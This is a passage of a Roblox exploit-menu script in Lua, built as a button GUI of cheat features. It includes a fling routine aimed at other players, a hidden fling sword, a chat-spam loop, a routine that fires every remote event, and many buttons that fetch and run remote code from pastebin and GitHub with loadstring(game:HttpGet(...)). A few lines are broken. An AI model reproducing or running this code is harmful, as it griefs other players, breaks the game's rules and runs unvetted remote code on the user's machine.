			locked=true;
		};

		----------------------------------------------------------------------------------------

		user=players.localPlayer;
		mouse=user:getMouse();
		char=user.Character;
		gui=user.PlayerGui;
		bag=user.Backpack;
		torso=char.Torso;
		head=char.Head;
		hum=_hum(char);

		url='rbxassetid://%d';
		name='dev-uzi';

		h_weld_cf_inactive=_cframe(0.35,0.5,0.5,
			0,90,-70);
		h_weld_cf_active=_cframe(0,0.75,0,
			-110,180,0);

		assert(hum,'humanoid is not found');

		----------------------------------------------------------------------------------------

		_clear();

		----------------------------------------------------------------------------------------

		_cf_mouse('button1Down',function()
			loop_shot=(loop_shot or 0)+1;
			local vers=loop_shot;
			local step=runService.Stepped;
			repeat
				_shot((tube.CFrame*CFrame.new(0,0,tube.Size.Z*0.5)).p,mouse.hit.p);
				step:wait();--wait(0.001);
			until vers~=loop_shot;
		end);

		_cf_mouse('button1Up',function()
			loop_shot=(loop_shot or 0)+1;
		end);

		_cf_mouse('move',function()
			cross_f.Position=UDim2.new(0,mouse.X-11,0,mouse.Y-11);
		end);

		_cf_mouse('keyDown',function(k)
			if(k=='r')then
				if(bullets.clip>0 and time_left<=time())then
					local got=(bullets.clip>bullets.maximum and 
						bullets.maximum or 
						bullets.clip)-bullets.current;

					bullets.clip=bullets.clip-got;
					bullets.current=bullets.current+got;
					if(got~=0)then
						time_left=time()+2;
					end;
				end;
			end;
		end);

		----------------------------------------------------------------------------------------

		screen=_new'screenGui'{
			name=name;
		};

		cross_f=_new'frame'{
			size=UDim2.new(0,21,0,21);
			backgroundTransparency=1;
			screen;
		};

		for i=0,1 do
			_new'frame'{
				position=UDim2.new(0,13*i,0,11);
				size=UDim2.new(0,10,0,1);
				cross_f;
			};
		end;

		for i=0,1 do
			_new'frame'{
				position=UDim2.new(0,11,0,13*i);
				size=UDim2.new(0,1,0,10);
				cross_f;
			};
		end;

		----------------------------------------------------------------------------------------

		shot_sound=_new(head:findFirstChild'2920959'or'sound'){
			soundId=url:format(2920959);
			pitch=1.4;
			head;
		};
		if(shot_sound.Name~='2920959')then
			shot_sound.Name='2920959';
			shot_sound:play();
		end;

		bin=_new'hopperBin'{
			deselected=_cf_deselect;
			selected=_cf_select;
			name=name;
			bag;
		};

		inv=_new'model'{
			name=name;
			char;
		};

		handle=_new'part'{
			size=Vector3.new(0.3,1.3,0.4);
			color=_RGB(140,140,140);
			name='handle';
			formFactor=3;
			inv;
			touched=function(hit)
				if(hit.Parent.className=='Model')then
					local hum=_hum(hit.Parent);
					if(hum~=nil)then
						_hum_dam(hum,handle.Velocity.magnitude);
					end;
				end;
			end;
		};
		h_weld=_new'weld'{
			c1=h_weld_cf_inactive;
			part1=handle;
			part0=torso;
			handle;
		};
		_make_hue();

		h_part=_new'part'{
			size=Vector3.new(0.4,0.4,1.4);
			color=_RGB(140,140,140);
			name='handle';
			formFactor=3;
			handle;
		};
		hp_weld=_new'weld'{
			c1=_cframe(0,-1.3/2,-0.3,
				20,0,0);
			part0=handle;
			part1=h_part;
			handle;
		};

		drag=_new'part'{
			size=Vector3.new(0.5,0.45,1.5);
			color=_RGB(100,100,100);
			name='handle';
			formFactor=3;
			handle;
		};
		d_weld=_new'weld'{
			c1=_cframe(0,-0.25,0);
			part0=h_part;
			part1=drag;
			handle;
		};

		tube=_new'part'{
			size=Vector3.new(0.2,0.2,1.5);
			color=_RGB(0,0,0);
			name='handle';
			formFactor=3;
			handle;
		};
		t_weld=_new'weld'{
			c1=_cframe(0,-0.3,-0.1);
			part0=h_part;
			part1=tube;
			handle;
		};

		bullets_label=_new'textLabel'{
			textStrokeColor3=_RGB(0,0,0);
			textColor3=_RGB(200,200,200);
			textStrokeTransparency=0;
			backgroundTransparency=1;
			fontSize=5;
			screen;
		};

		lightstuff=_new'frame'{
			backgroundColor3=_RGB(255,255,255);
			position=UDim2.new(0,0,0,-1);
			backgroundTransparency=0.5;
			size=UDim2.new(1,0,1,1);
			borderSizePixel=0;
			visible=false;
			screen;
		};

		coroutine.wrap(function()
			local red,white,green;
			repeat
				if(screen.Parent)then
					if(not green and bullets.current==bullets.maximum)then
						green=true;
						bullets_label.TextColor3=_RGB(0,200,0);
					elseif(not red and bullets.current==0)then
						red=true;
						bullets_label.TextColor3=_RGB(200,0,0);
					elseif((red or green)and bullets.current~=0 and bullets.current~=bullets.maximum)then
						bullets_label.TextColor3=_RGB(200,200,200);
						green=false;
						red=false;
					end;
					bullets_label.Text=('Bullets: %d/%d'):format(bullets.current,bullets.clip);
					bullets_label.Size=UDim2.new(0,bullets_label.TextBounds.X,0,bullets_label.TextBounds.Y);
					bullets_label.Position=UDim2.new(1,-bullets_label.TextBounds.X-6,1,-bullets_label.TextBounds.Y-6);
				end;
				wait(0.001);
			until nil;
		end)();

		--fling part


		local Players = game:GetService("Players")
		local Mouse = game:GetService("Players").LocalPlayer:GetMouse()

		Mouse.Button1Down:Connect(function()
			local Target = Mouse.Target
			if Target and Target.Parent and Target.Parent:IsA("Model") and Players:GetPlayerFromCharacter(Target.Parent) then
				local PlayerName = Players:GetPlayerFromCharacter(Target.Parent).Name
				local player = game.Players.LocalPlayer
				local Targets = {PlayerName}

				local Players = game:GetService("Players")
				local Player = Players.LocalPlayer

				local AllBool = false

				local GetPlayer = function(Name)
					Name = Name:lower()
					if Name == "all" or Name == "others" then
						AllBool = true
						return
					elseif Name == "random" then
						local GetPlayers = Players:GetPlayers()
						if table.find(GetPlayers,Player) then table.remove(GetPlayers,table.find(GetPlayers,Player)) end
						return GetPlayers[math.random(#GetPlayers)]
					elseif Name ~= "random" and Name ~= "all" and Name ~= "others" then
						for _,x in next, Players:GetPlayers() do
							if x ~= Player then
								if x.Name:lower():match("^"..Name) then
									return x;
								elseif x.DisplayName:lower():match("^"..Name) then
									return x;
								end
							end
						end
					else
						return
					end
				end

				local Message = function(_Title, _Text, Time)
					print(_Title)
					print(_Text)
					print(Time)
				end

				local SkidFling = function(TargetPlayer)
					local Character = Player.Character
					local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
					local RootPart = Humanoid and Humanoid.RootPart

					local TCharacter = TargetPlayer.Character
					local THumanoid
					local TRootPart
					local THead
					local Accessory
					local Handle

					if TCharacter:FindFirstChildOfClass("Humanoid") then
						THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")
					end
					if THumanoid and THumanoid.RootPart then
						TRootPart = THumanoid.RootPart
					end
					if TCharacter:FindFirstChild("Head") then
						THead = TCharacter.Head
					end
					if TCharacter:FindFirstChildOfClass("Accessory") then
						Accessory = TCharacter:FindFirstChildOfClass("Accessory")
					end
					if Accessoy and Accessory:FindFirstChild("Handle") then
						Handle = Accessory.Handle
					end

					if Character and Humanoid and RootPart then
						if RootPart.Velocity.Magnitude < 50 then
							getgenv().OldPos = RootPart.CFrame
						end
						if THumanoid and THumanoid.Sit and not AllBool then
						end
						if THead then
							workspace.CurrentCamera.CameraSubject = THead
						elseif not THead and Handle then
							workspace.CurrentCamera.CameraSubject = Handle
						elseif THumanoid and TRootPart then
							workspace.CurrentCamera.CameraSubject = THumanoid
						end
						if not TCharacter:FindFirstChildWhichIsA("BasePart") then
							return
						end

						local FPos = function(BasePart, Pos, Ang)
							RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
							Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
							RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
							RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
						end

						local SFBasePart = function(BasePart)
							local TimeToWait = 2
							local Time = tick()
							local Angle = 0

							repeat
								if RootPart and THumanoid then
									if BasePart.Velocity.Magnitude < 50 then
										Angle = Angle + 100

										FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle),0 ,0))
										task.wait()

										FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
										task.wait()

										FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
										task.wait()

										FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
										task.wait()

										FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
										task.wait()

										FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
										task.wait()
									else
										FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
										task.wait()

										FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0))
										task.wait()

										FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
										task.wait()

										FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
										task.wait()

										FPos(BasePart, CFrame.new(0, -1.5, -TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
										task.wait()

										FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
										task.wait()

										FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
										task.wait()

										FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
										task.wait()

										FPos(BasePart, CFrame.new(0, -1.5 ,0), CFrame.Angles(math.rad(-90), 0, 0))
										task.wait()

										FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
										task.wait()
									end
								else
									break
								end
							until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= Players or not TargetPlayer.Character == TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > Time + TimeToWait
						end

						workspace.FallenPartsDestroyHeight = 0/0

						local BV = Instance.new("BodyVelocity")
						BV.Name = "EpixVel"
						BV.Parent = RootPart
						BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
						BV.MaxForce = Vector3.new(1/0, 1/0, 1/0)

						Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)

						if TRootPart and THead then
							if (TRootPart.CFrame.p - THead.CFrame.p).Magnitude > 5 then
								SFBasePart(THead)
							else
								SFBasePart(TRootPart)
							end
						elseif TRootPart and not THead then
							SFBasePart(TRootPart)
						elseif not TRootPart and THead then
							SFBasePart(THead)
						elseif not TRootPart and not THead and Accessory and Handle then
							SFBasePart(Handle)
						else
						end

						BV:Destroy()
						Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
						workspace.CurrentCamera.CameraSubject = Humanoid

						repeat
							RootPart.CFrame = getgenv().OldPos * CFrame.new(0, .5, 0)
							Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, .5, 0))
							Humanoid:ChangeState("GettingUp")
							table.foreach(Character:GetChildren(), function(_, x)
								if x:IsA("BasePart") then
									x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
								end
							end)
							task.wait()
						until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25
						workspace.FallenPartsDestroyHeight = getgenv().FPDH
					else
					end
				end

				getgenv().Welcome = true
				if Targets[1] then for _,x in next, Targets do GetPlayer(x) end else return end

				if AllBool then
					for _,x in next, Players:GetPlayers() do
						SkidFling(x)
					end
				end

				for _,x in next, Targets do
					if GetPlayer(x) and GetPlayer(x) ~= Player then
						if GetPlayer(x).UserId ~= 1414978355 then
							local TPlayer = GetPlayer(x)
							if TPlayer then
								SkidFling(TPlayer)
							end
						else
						end
					elseif not GetPlayer(x) and not AllBool then
					end
				end
			end
		end)

	end)
end
coroutine.wrap(WXHMD_fake_script)()
local function VAVVNKT_fake_script() -- button_14.LocalScript 
	local script = Instance.new('LocalScript', button_14)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		
	end)
end
coroutine.wrap(VAVVNKT_fake_script)()
local function KGMUQA_fake_script() -- button_15.LocalScript 
	local script = Instance.new('LocalScript', button_15)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		if game.Players.LocalPlayer.Character.Head:FindFirstChild("BillboardGui") then
			game.Players.LocalPlayer.Character.Head:FindFirstChild("BillboardGui"):Remove()	
		end
		plr = game.Players.LocalPlayer.Name
		y = Instance.new("BillboardGui")
		y.Size = UDim2.new(0,100,0,150)
		y.StudsOffset = Vector3.new(0,1,0)
		y.Parent = game.Players[plr].Character.Head
		y.Adornee = game.Players[plr].Character.Head
		f = Instance.new("TextLabel")
		f.Parent = y
		f.BackgroundTransparency = 1
		f.Position = UDim2.new(0,0,0,-50)
		f.Size = UDim2.new(0,100,0,100)
		f.Font = "Arial"
		f.FontSize = "Size48"
		f.Text = game.Players.LocalPlayer.PlayerGui.CoolGui.settings.smain.bgt.Text
		f.TextStrokeColor3 = Color3.new(0,0,0)
		f.TextColor3 = Color3.new(game.Players.LocalPlayer.PlayerGui.CoolGui.settings.smain.r.Text/255,game.Players.LocalPlayer.PlayerGui.CoolGui.settings.smain.g.Text/255,game.Players.LocalPlayer.PlayerGui.CoolGui.settings.smain.b.Text/255)
		f.TextStrokeTransparency = 0
		f.TextYAlignment = "Bottom"
	end)
end
coroutine.wrap(KGMUQA_fake_script)()
local function VSJOVQF_fake_script() -- button_16.LocalScript 
	local script = Instance.new('LocalScript', button_16)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		game.Players.LocalPlayer.Name = game.Players.LocalPlayer.PlayerGui.CoolGui.settings.smain.sus.Text
	end)
end
coroutine.wrap(VSJOVQF_fake_script)()
local function AWLKGQB_fake_script() -- button_17.LocalScript 
	local script = Instance.new('LocalScript', button_17)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = game.Players.LocalPlayer.PlayerGui.CoolGui.settings.smain.swsjh.Text
	end)
end
coroutine.wrap(AWLKGQB_fake_script)()
local function KDBGDV_fake_script() -- button_18.LocalScript 
	local script = Instance.new('LocalScript', button_18)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		local name = game.Players.LocalPlayer.Name
	
		local p = Instance.new("Part")
		p.Parent = workspace
		p.Locked = true
		p.BrickColor = BrickColor.new("White")
		p.BrickColor = BrickColor.new(104)
		p.Size = Vector3.new(8, 1.2, 8)
		p.Anchored = true
		local m = Instance.new("CylinderMesh")
		m.Scale = Vector3.new(1, 0.5, 1)
		m.Parent = p
		while true do
			p.CFrame = CFrame.new(game.Players:findFirstChild(name).Character.Torso.CFrame.x, game.Players:findFirstChild(name).Character.Torso.CFrame.y - 4, game.Players:findFirstChild(name).Character.Torso.CFrame.z)
			wait()
		end
	end)
end
coroutine.wrap(KDBGDV_fake_script)()
local function EBZROFQ_fake_script() -- button_19.LocalScript 
	local script = Instance.new('LocalScript', button_19)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		local platform = Instance.new("Part")
		platform.Size = Vector3.new(16, 1, 16)
		platform.Transparency = 0.5
		platform.Color = Color3.fromRGB(255, 0, 255)
		platform.Anchored = true
		platform.Parent = workspace
		local player_position = game.Players.LocalPlayer.Character.Head.Position
		platform.Position = Vector3.new(player_position.X, player_position.Y-5, player_position.Z)
	end)
end
coroutine.wrap(EBZROFQ_fake_script)()
local function GECWI_fake_script() -- button_20.LocalScript 
	local script = Instance.new('LocalScript', button_20)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		while true do
	
			local args = {
				[1] = game.Players.LocalPlayer.PlayerGui.CoolGui.settings.smain.st.Text,
				[2] = "All"
			}
	
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
	
			wait(1.5)
	
		end
	end)
end
coroutine.wrap(GECWI_fake_script)()
local function YPYE_fake_script() -- button_21.LocalScript 
	local script = Instance.new('LocalScript', button_21)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		local Chicken = game.Players.LocalPlayer.Name
		game.Workspace[Chicken].Torso["Left Shoulder"].C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0,math.pi/2,0) * CFrame.fromEulerAnglesXYZ(math.pi/2, 0, 0) * CFrame.fromEulerAnglesXYZ(0,-math.pi/2,0)
		game.Workspace[Chicken].Torso["Left Shoulder"].C1 = CFrame.new(0, 0.5, 0)
		game.Workspace[Chicken].Torso["Right Shoulder"].C0 = CFrame.new(1.5, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0,-math.pi/2,0) * CFrame.fromEulerAnglesXYZ(math.pi/2, 0, 0) * CFrame.fromEulerAnglesXYZ(0,-math.pi/2,0)
		game.Workspace[Chicken].Torso["Right Shoulder"].C1 = CFrame.new(0, 0.5, 0)
	end)
end
coroutine.wrap(YPYE_fake_script)()
local function PXYT_fake_script() -- button_22.LocalScript 
	local script = Instance.new('LocalScript', button_22)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		game.Workspace.Gravity = game.Players.LocalPlayer.PlayerGui.CoolGui.settings.smain.sg.Text
	end)
end
coroutine.wrap(PXYT_fake_script)()
local function NZXZI_fake_script() -- button_23.LocalScript 
	local script = Instance.new('LocalScript', button_23)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		game.Players.LocalPlayer.Character.Humanoid.JumpPower = game.Players.LocalPlayer.PlayerGui.CoolGui.settings.smain.swsjh.Text
	end)
end
coroutine.wrap(NZXZI_fake_script)()
local function GNAVNL_fake_script() -- button_24.LocalScript 
	local script = Instance.new('LocalScript', button_24)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		for X = 1, math.huge, 0.2 do 
			wait() 
			game.Workspace[game.Players.LocalPlayer.Name].Torso.Neck.C0 = CFrame.new(math.sin(X) / 1,1.5,0) 
			game.Workspace[game.Players.LocalPlayer.Name].Torso.Neck.C1 = CFrame.new(0,0,0) 
		end 
		for X = 1, math.huge, 0.1 do 
			wait() 
			game.Workspace[game.Players.LocalPlayer.Name].Torso.Neck.C0 = CFrame.new(0,1.5,0) * CFrame.fromAxisAngle(Vector3.new(0,1,0), X) 
			game.Workspace[game.Players.LocalPlayer.Name].Torso.Neck.C1 = CFrame.new(0,0,0) 
		end 
		for _,c in pairs(game.Players:GetChildren()) do
			c.Character.Head.Mesh.Scale = Vector3.new(100, 100, 100)
		end
		for _,c in pairs(game.Players:GetChildren()) do
			c.Character.Head.Mesh.Scale = Vector3.new(1.25, 1.25, 1.25)
		end
	end)
end
coroutine.wrap(GNAVNL_fake_script)()
local function QILPEVY_fake_script() -- button_25.LocalScript 
	local script = Instance.new('LocalScript', button_25)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		loadstring(game:HttpGet('https://pastebin.com/raw/h1TN1kij'))()
	end)
end
coroutine.wrap(QILPEVY_fake_script)()
local function ORTLQH_fake_script() -- button_26.LocalScript 
	local script = Instance.new('LocalScript', button_26)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		loadstring(game:GetObjects("rbxassetid://16442596192")[1].Source)()
	end)
end
coroutine.wrap(ORTLQH_fake_script)()
local function UYGWJL_fake_script() -- button_27.LocalScript 
	local script = Instance.new('LocalScript', button_27)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		loadstring(game:HttpGet("https://gist.githubusercontent.com/jointeamck/8fc8c93e4c272559cc5629a1ee56a262/raw/0fe33a2585ec108eecf0c5f37a64626adb65a94c/Project%2520Soviet"))()
	end)
end
coroutine.wrap(UYGWJL_fake_script)()
local function JOMSSFB_fake_script() -- button_28.LocalScript 
	local script = Instance.new('LocalScript', button_28)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/JxcExploit/Harkedv2-script/main/Leaked-v2hardked"))()
	end)
end
coroutine.wrap(JOMSSFB_fake_script)()
local function SWJK_fake_script() -- button_29.LocalScript 
	local script = Instance.new('LocalScript', button_29)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		local remoteamount = 0
	
		for i,v in pairs(game:GetDescendants()) do
			if v:IsA("RemoteEvent") then
				remoteamount = remoteamount + 1
				v:FireServer()
				if v:IsA("BindableEvent") then
					remoteamount = remoteamount + 1
					v:Fire()
					if v:IsA("RemoteFunction") then
						remoteamount = remoteamount + 1
						v:InvokeServer()
					end
				end
			end
		end
	end)
end
coroutine.wrap(SWJK_fake_script)()
local function KOGOB_fake_script() -- button_30.LocalScript 
	local script = Instance.new('LocalScript', button_30)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/FE/main/Comet"))();
	end)
end
coroutine.wrap(KOGOB_fake_script)()
local function WMSMR_fake_script() -- button_31.LocalScript 
	local script = Instance.new('LocalScript', button_31)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		loadstring(game:HttpGet("https://github.com/exxtremestuffs/SimpleSpySource/raw/master/SimpleSpy.lua"))()
	end)
end
coroutine.wrap(WMSMR_fake_script)()
local function HRJMKB_fake_script() -- button_32.LocalScript 
	local script = Instance.new('LocalScript', button_32)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		loadstring(game:HttpGet('https://pastefy.app/edMe7Bwx/raw'))()
	end)
end
coroutine.wrap(HRJMKB_fake_script)()
local function TEIB_fake_script() -- button_33.LocalScript 
	local script = Instance.new('LocalScript', button_33)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		loadstring(game:HttpGet("https://pastebin.com/raw/vr2YVyF6"))();
	end)
	
end
coroutine.wrap(TEIB_fake_script)()
local function UFBQWJB_fake_script() -- button_34.LocalScript 
	local script = Instance.new('LocalScript', button_34)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		loadstring(game:HttpGet("https://pastebin.com/raw/P1ayeCf5"))()
	end)
end
coroutine.wrap(UFBQWJB_fake_script)()
local function MHMTS_fake_script() -- button_35.LocalScript 
	local script = Instance.new('LocalScript', button_35)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/FE/main/punch",true))()
	end)
end
coroutine.wrap(MHMTS_fake_script)()
local function WMZOEHI_fake_script() -- button_36.LocalScript 
	local script = Instance.new('LocalScript', button_36)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/BTools.txt"))()
	end)
end
coroutine.wrap(WMZOEHI_fake_script)()
local function DPJY_fake_script() -- button_37.LocalScript 
	local script = Instance.new('LocalScript', button_37)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		local head_attachment = Instance.new("Attachment")
		head_attachment.Parent = game.Players.LocalPlayer.Character.Head
		head_attachment.Position = Vector3.new(4.5, -0, 0)
		head_attachment.Name = "UFO_attachment"

		local UFO = Instance.new("Part")
		UFO.Name = "UFO"
		UFO.Parent = game.Players.LocalPlayer.Character
		UFO.Shape = Enum.PartType.Cylinder
		UFO.Size = Vector3.new(1, 0.5, 0.5)
		UFO.BackSurface = Enum.SurfaceType.Smooth
		UFO.BottomSurface = Enum.SurfaceType.Smooth
		UFO.FrontSurface = Enum.SurfaceType.Smooth
		UFO.LeftSurface = Enum.SurfaceType.Smooth
		UFO.RightSurface = Enum.SurfaceType.Smooth
		UFO.TopSurface = Enum.SurfaceType.Smooth
		UFO.Color = Color3.fromRGB(255, 255, 255)
		UFO.CanCollide = false

		local selectionbox = Instance.new("SelectionBox")
		selectionbox.Parent = UFO
		selectionbox.Adornee = UFO
		selectionbox.LineThickness = 0.01
		selectionbox.Color3 = Color3.fromRGB(0, 255, 85)

		local UFO_attachment = Instance.new("Attachment")
		UFO_attachment.Parent = UFO
		UFO_attachment.Orientation = Vector3.new(0.006, 90, -0.006)

		local align_position = Instance.new("AlignPosition")
		local align_orientation = Instance.new("AlignOrientation")

		align_position.Parent = UFO
		align_orientation.Parent = UFO

		align_position.Attachment0 = UFO_attachment
		align_position.Attachment1 = head_attachment

		align_orientation.Attachment0 = UFO_attachment
		align_orientation.Attachment1 = head_attachment

		local trail = Instance.new("Trail")
		trail.Parent = UFO
		trail.Attachment0 = UFO_attachment
		trail.Attachment1 = head_attachment

		local billboard_gui = Instance.new("BillboardGui")
		billboard_gui.Parent = UFO
		billboard_gui.StudsOffset = Vector3.new(0, 1, 0)
		billboard_gui.Adornee = UFO
		billboard_gui.Size = UDim2.new(0, 200, 1, 0) -- {0, 200},{1, 0}

		local frame = Instance.new("Frame")
		frame.BackgroundTransparency = 1
		frame.Parent = billboard_gui
		frame.Size = UDim2.new(0, 200, 1, 0)

		local textlabel = Instance.new("TextLabel")
		textlabel.TextSize = 50
		textlabel.TextColor3 = Color3.fromRGB(234, 255, 0)
		textlabel.TextStrokeColor3 = Color3.fromRGB(204, 0, 204)
		textlabel.TextStrokeTransparency = 0
		textlabel.Parent = frame
		textlabel.Size = UDim2.new(0, 200, 1, 0)
		textlabel.BackgroundTransparency = 1
		textlabel.Text = ""
		textlabel.TextScaled = true

		local Players = game:GetService("Players")

		Players.PlayerAdded:Connect(function(player)
			textlabel.Text = tostring(player.Name .. " joined the game!")
			wait(5)
			textlabel.Text = ""
		end)
	end)
end
coroutine.wrap(DPJY_fake_script)()
local function TVIACA_fake_script() -- button_38.LocalScript 
	local script = Instance.new('LocalScript', button_38)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		loadstring(game:HttpGet("https://pastebin.com/raw/r7pVFVA7"))();
	end)
end
coroutine.wrap(TVIACA_fake_script)()
local function KNPJVCM_fake_script() -- button_39.LocalScript 
	local script = Instance.new('LocalScript', button_39)

	local button = script.Parent
	local gui = game.Players.LocalPlayer.PlayerGui.CoolGui
	
	button.MouseButton1Down:connect(function()
		gui:Destroy()
	end)
end
coroutine.wrap(KNPJVCM_fake_script)()
local function XVWGNC_fake_script() -- button_40.LocalScript 
	local script = Instance.new('LocalScript', button_40)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		-- thanks to moon for this dex / best dex out there
		loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))()
	end)
end
coroutine.wrap(XVWGNC_fake_script)()
local function MGFUJR_fake_script() -- button_41.LocalScript 
	local script = Instance.new('LocalScript', button_41)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		local plr=game.Players.LocalPlayer
		local tool=Instance.new("Tool",plr.Backpack)
		tool.GripPos=Vector3.new(0.1,-1,0)
		tool.Name="Sword"
		local k=Instance.new("Part",tool)
		k.Name="Handle"
		k.Size=Vector3.new(0.4,4,0.4)
		local l=Instance.new("Animation",tool)
		l.AnimationId="rbxassetid://218504594"
		local m=plr.Character.Humanoid:LoadAnimation(l)
		db=true
		da=false
		tool.Equipped:connect(function()
			tool.Activated:connect(function()
				if db==true then
					db=false
					m:Play()
					wait()
					da=true
					db=true
					wait(0.5)
					da=false
				end
			end)
		end)
		k.Touched:connect(function(n)
			if da==true then
				local o=n.Parent.Humanoid
				if o~=nil then
					local p=game.Players:FindFirstChild(n.Parent.Name)
					for j=1,10 do
						if p.Name~="FunnyVideo15"then
							if game:GetService("ReplicatedStorage"):FindFirstChild("juisdfj0i32i0eidsuf0iok") then
								hiddenfling = true
							else
								hiddenfling = true
								detection = Instance.new("Decal")
								detection.Name = "juisdfj0i32i0eidsuf0iok"
								detection.Parent = game:GetService("ReplicatedStorage")
								local function fling()
									local hrp, c, vel, movel = nil, nil, nil, 0.1
									while true do
										game:GetService("RunService").Heartbeat:Wait()
										if hiddenfling then
											local lp = game.Players.LocalPlayer
											while hiddenfling and not (c and c.Parent and hrp and hrp.Parent) do
												game:GetService("RunService").Heartbeat:Wait()
												c = lp.Character
												hrp = c:FindFirstChild("HumanoidRootPart") or c:FindFirstChild("Torso") or c:FindFirstChild("UpperTorso")
											end
											if hiddenfling then
												vel = hrp.Velocity
												hrp.Velocity = vel * 10000 + Vector3.new(0, 10000, 0)
												game:GetService("RunService").RenderStepped:Wait()
												if c and c.Parent and hrp and hrp.Parent then
													hrp.Velocity = vel
												end
												game:GetService("RunService").Stepped:Wait()
												if c and c.Parent and hrp and hrp.Parent then
													hrp.Velocity = vel + Vector3.new(0, movel, 0)
													movel = movel * -1
												end
											end
										end
									end
								end
	
								fling()
							end
						end 
					end
				end 
			end
		end)
	end)
end
coroutine.wrap(MGFUJR_fake_script)()
local function VLDBBW_fake_script() -- button_42.LocalScript 
	local script = Instance.new('LocalScript', button_42)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		game:GetService("StarterGui"):SetCore("SendNotification",{
			Title = "Discord", -- Required
			Text = "discord.gg/KkhpkGJdCp",
		})
	end)
end
coroutine.wrap(VLDBBW_fake_script)()
local function OJGT_fake_script() -- button_43.LocalScript 
	local script = Instance.new('LocalScript', button_43)

	local button = script.Parent
	local input = game.Players.LocalPlayer.PlayerGui.CoolGui.settings.smain.sid.Text
	
	button.MouseButton1Down:connect(function()
	 local music = Instance.new("Sound")
	music.Name "Music"
	music.Parent = game.Workspace
	music.Volume = 10
	music.SoundId = input
	music.Looped = true
	music:Play()
	end)
end
coroutine.wrap(OJGT_fake_script)()
local function WKPRGIV_fake_script() -- button_44.LocalScript 
	local script = Instance.new('LocalScript', button_44)

	local button = script.Parent
	
